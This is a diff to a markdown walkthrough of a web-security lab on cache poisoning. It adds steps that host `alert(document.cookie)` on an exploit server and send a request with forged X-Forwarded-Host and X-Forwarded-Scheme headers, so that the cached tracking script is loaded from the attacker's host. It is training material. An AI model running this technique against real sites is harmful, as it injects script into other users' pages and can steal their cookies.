@@ -57,3 +57,15 @@ The `Location` header shows that you are being redirected to the same URL that y
 
 ![[Pasted image 20240809035608.png]]
 
+> On exploit-server change the file name to match the path used by the vulnerable response: /resources/js/tracking.js. In body write `alert(document.cookie)` script.
+
+```
+GET /resources/js/tracking.js HTTP/1.1
+Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
+X-Forwarded-Host: exploit-server.web-security-academy.net/
+X-Forwarded-Scheme: http
+```
+
+To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser.
+
+
